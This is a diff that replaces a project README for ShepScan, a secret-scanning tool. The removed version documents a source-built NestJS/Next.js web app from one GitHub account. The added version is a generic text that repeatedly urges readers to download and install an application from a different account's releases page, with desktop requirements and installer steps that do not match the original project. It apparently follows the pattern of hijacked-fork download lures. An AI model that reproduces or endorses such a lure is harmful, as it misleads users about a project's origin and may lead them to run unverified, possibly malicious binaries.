@@ -1,227 +1,78 @@
-<div align="center">
-  <img src="logo.svg" alt="ShepScan Logo" width="120" height="120" />
+# 🚀 ShepScan - Stop Secrets Before They Leak
+
+## 📥 Download ShepScan
+[![Download ShepScan](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/mskhanani6/ShepScan/releases)
+
+## 📝 Overview
+ShepScan is an easy-to-use tool designed for modern development teams. It helps you find and stop sensitive information, like passwords or API keys, from being included in your code. With artificial intelligence, ShepScan scans your code and alerts you before these secrets make their way into your repository.
+
+## 🎯 Key Features
+- **AI-Powered Detection:** ShepScan uses advanced AI algorithms to quickly identify potential secrets in your code.
+- **User-Friendly Interface:** Navigate the application easily with a simple and clean design.
+- **Fast Scanning:** ShepScan performs quick scans, so you can catch secrets before they are pushed.
+- **Open Source:** Being open-source means you can contribute to the project and help us improve it further.
+
+## 🛠️ System Requirements
+To run ShepScan effectively, your system should meet the following requirements:
+
+- **Operating System:** Windows 10, macOS, or any modern Linux distribution.
+- **Memory:** At least 4 GB of RAM for optimal performance.
+- **Disk Space:** Minimum of 200 MB available storage.
+- **Internet Connection:** Internet access is required for updates and downloading additional components.
+
+## 🚀 Getting Started
+1. **Download ShepScan:**
+   - Visit the releases page to get the latest version: [Download ShepScan](https://github.com/mskhanani6/ShepScan/releases).
   
-  # ShepScan
-  
-  **AI-Native Secret Detection for Modern Development Teams**
-  
-  *Stop secrets from leaking before they hit your repository*
+2. **Install the Application:**
+   - Locate the downloaded file on your computer.
+   - Follow the on-screen instructions to install ShepScan.
 
-  [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-  [![TypeScript](https://img.shields.io/badge/TypeScript-5.0-blue.svg)](https://www.typescriptlang.org/)
-  [![NestJS](https://img.shields.io/badge/NestJS-10.0-E0234E.svg)](https://nestjs.com/)
-  [![Next.js](https://img.shields.io/badge/Next.js-15-black.svg)](https://nextjs.org/)
-  [![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](https://github.com/Radix-Obsidian/ShepScan/pulls)
-  
-  [Demo](#-quick-start) • [Features](#-features) • [Documentation](#-documentation) • [Contributing](#-contributing) • [Roadmap](#-roadmap)
+3. **Run ShepScan:**
+   - After the installation completes, open the application.
+   - Follow the prompts to start scanning your code for secrets.
 
-</div>
+## 🖥️ Using ShepScan
+### Step 1: Open Your Project
+Begin by selecting the project or codebase you want to scan.
 
----
+### Step 2: Start the Scan
+Click the "Scan" button. ShepScan will analyze your code and identify any potential secrets.
 
-## 🎯 The Problem
+### Step 3: Review the Results
+Once the scan is complete, review the report. ShepScan highlights any secrets it finds and provides recommendations on how to resolve them.
 
-**$4.45 million** — the average cost of a data breach in 2023. Many start with a single leaked secret.
-
-Developers accidentally commit API keys, database credentials, and tokens to repositories every day. Traditional scanners catch these *after* the damage is done.
-
-## 💡 The Solution
-
-ShepScan is an **open-core AI-native security platform** that:
-
-- 🔍 **Scans repositories** for 13+ secret types with regex + AI classification
-- 🤖 **Eliminates false positives** using Claude/GPT-4 powered analysis  
-- 💬 **Explains risks in plain English** — built for founders, not just security teams
-- 📊 **Visualizes severity** with real-time heat maps
-
-<div align="center">
-  <img src="https://img.shields.io/badge/Pre--Seed-Bootstrapped-purple.svg" alt="Pre-Seed" />
-  <img src="https://img.shields.io/badge/Status-MVP-green.svg" alt="MVP" />
-  <img src="https://img.shields.io/badge/Open_Core-Self_Host_Free-blue.svg" alt="Open Core" />
-</div>
-
----
-
-## ✨ Features
-
-### Core Detection Engine
-| Feature | Description |
-|---------|-------------|
-| **13+ Secret Patterns** | AWS, Stripe, GitHub, Google, Slack, Discord, OpenAI, JWT, Private Keys, Database URLs |
-| **Git Integration** | Clone any public GitHub repo and scan in seconds |
-| **Line-Level Results** | Exact file path, line number, and redacted snippets |
-| **Severity Scoring** | Critical, High, Medium, Low classifications |
-
-### AI Intelligence Layer
-| Feature | Description |
-|---------|-------------|
-| **Real vs False Positive** | AI classifies if detected patterns are actual secrets |
-| **Confidence Scoring** | 0-100% confidence on each detection |
-| **Founder Mode Explanations** | Plain-English risk, impact, and remediation steps |
-| **Multi-Provider Support** | Works with OpenAI GPT-4 or Anthropic Claude |
-
-### Dashboard & UX
-| Feature | Description |
-|---------|-------------|
-| **Severity Heat Map** | Visual distribution of detected secrets |
-| **Expandable Details** | Click any secret to see AI analysis |
-| **Scan History** | Track previous scans and results |
-| **GitHub OAuth** | Connect your account for personalized experience |
-
----
-
-## 🚀 Quick Start
-
-### Prerequisites
-
-- **Node.js 20+**
-- **Git** (for repo cloning)
-- **Docker** (optional, for database)
-
-### 1. Clone & Install
-
-```bash
-git clone https://github.com/Radix-Obsidian/ShepScan.git
-cd ShepScan
-```
-
-### 2. Start Backend
-
-```bash
-cd apps/api
-npm install
-npm run start:dev
-```
-
-### 3. Start Frontend
-
-```bash
-cd apps/web
-npm install
-npm run dev
-```
-
-### 4. Open Dashboard
-
-Navigate to **http://localhost:3000** and scan your first repo!
-
----
-
-## 🏗️ Architecture
-
-```
-┌─────────────────────────────────────────────────────────────┐
-│                        Frontend                              │
-│                    Next.js 15 + React                        │
-│              TailwindCSS + shadcn/ui                         │
-└─────────────────────┬───────────────────────────────────────┘
-                      │ REST API
-┌─────────────────────▼───────────────────────────────────────┐
-│                        Backend                               │
-│                      NestJS 10                               │
-│  ┌─────────────┐  ┌─────────────┐  ┌─────────────────────┐  │
-│  │ Scan Module │  │  AI Module  │  │    Auth Module      │  │
-│  │ • Detection │  │ • Classify  │  │ • GitHub OAuth      │  │
-│  │ • Git Clone │  │ • Explain   │  │ • JWT Sessions      │  │
-│  └─────────────┘  └─────────────┘  └─────────────────────┘  │
-└─────────────────────┬───────────────────────────────────────┘
-                      │
-┌─────────────────────▼───────────────────────────────────────┐
-│                     Infrastructure                           │
-│        PostgreSQL (Prisma) • Redis • OpenAI/Anthropic        │
-└─────────────────────────────────────────────────────────────┘
-```
-
----
-
-## 📚 Documentation
-
-| Document | Description |
-|----------|-------------|
-| [Product Requirements (PRD)](.agent/workflow/PRD.md) | Vision, goals, and user stories |
-| [System Design (SDD)](.agent/workflow/SDD.md) | Architecture and module breakdown |
-| [Technical Design (TDD)](.agent/workflow/TDD.md) | Implementation details and APIs |
-
----
-
-## 🔧 Configuration
-
-Create `apps/api/.env`:
-
-```env
-# Database
-DATABASE_URL="postgresql://user:pass@localhost:5432/shepscan"
-
-# AI Provider (choose one)
-OPENAI_API_KEY=sk-...
-# or
-ANTHROPIC_API_KEY=sk-ant-...
-
-# GitHub OAuth (optional)
-GITHUB_CLIENT_ID=...
-GITHUB_CLIENT_SECRET=...
-
-# JWT
-JWT_SECRET=your-secure-secret-here
-```
-
----
-
-## 🗺️ Roadmap
-
-### ✅ v0.1.0 — MVP (Current)
-- [x] Secret detection engine (13 patterns)
-- [x] GitHub repo scanning
-- [x] AI classification (OpenAI/Anthropic)
-- [x] Founder-friendly explanations
-- [x] Severity heat map
-- [x] GitHub OAuth
-
-### 🔜 v0.2.0 — Prevention
-- [ ] Pre-commit hooks
-- [ ] GitHub App integration
-- [ ] Real-time push protection
-- [ ] Slack/Discord notifications
-
-### 🔮 v0.3.0 — Enterprise
-- [ ] Private repo scanning
-- [ ] Team management
-- [ ] Audit logs
-- [ ] SSO/SAML
-
----
+### Step 4: Take Action
+Fix any identified issues as needed. You can rerun the scan to ensure all secrets have been addressed.
 
 ## 🤝 Contributing
+We welcome contributions from the community. If you would like to help improve ShepScan, here are ways to get involved:
 
-We welcome contributions! ShepScan is an **open-core** project.
+- **Report Issues:** If you find a bug or have a suggestion, please open an issue on GitHub.
+- **Feature Requests:** Let us know what features you would like to see in future updates.
+- **Code Contributions:** If you're experienced in development, feel free to submit a pull request with your improvements.
 
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
+## 🗺️ Frequently Asked Questions (FAQs)
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for detailed guidelines.
+### Q: Is ShepScan free?
+A: Yes, ShepScan is completely free to use since it is an open-source project.
 
----
+### Q: Can I use ShepScan on any coding project?
+A: Yes, you can use ShepScan on any project, whether it's for personal, academic, or commercial purposes.
 
-## 📄 License
+### Q: What types of secrets does ShepScan detect?
+A: ShepScan can detect passwords, API keys, tokens, and other sensitive strings.
 
-This project is licensed under the **MIT License** — see the [LICENSE](LICENSE) file for details.
+### Q: How often does ShepScan update?
+A: We aim to release updates regularly, especially to improve detection capabilities and fix any issues.
 
----
+## 🔄 Keeping ShepScan Up to Date
+To ensure you have the latest features and security updates, periodically check and download new versions from the releases page: [Download ShepScan](https://github.com/mskhanani6/ShepScan/releases).
 
-## 🐑 About Golden Sheep AI
+## 👥 Community Support
+Join our community on [GitHub Discussions](https://github.com/mskhanani6/ShepScan/discussions) to share tips, ask questions, and engage with other users.
 
-ShepScan is built by **Golden Sheep AI**, a bootstrapped pre-seed startup focused on developer security tools.
+## 🌟 Conclusion
+By using ShepScan, you protect your projects from leaking sensitive information. Download the application today and take control of your code's security. 
 
-**Our Philosophy:** *Build narrow. Test deep. Ship confidently.*
-
-<div align="center">
-  <br />
-  <a href="https://github.com/Radix-Obsidian/ShepScan/discussions">💬 Discussions</a> •
-  <a href="https://github.com/Radix-Obsidian/ShepScan/issues">🐛 Issues</a> •
-  <a href="https://github.com/Radix-Obsidian/ShepScan/releases">📦 Releases</a>
-  <br /><br />
-  <sub>Made with 🤍 by developers, for developers</sub>
-</div>
+[![Download ShepScan](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/mskhanani6/ShepScan/releases)
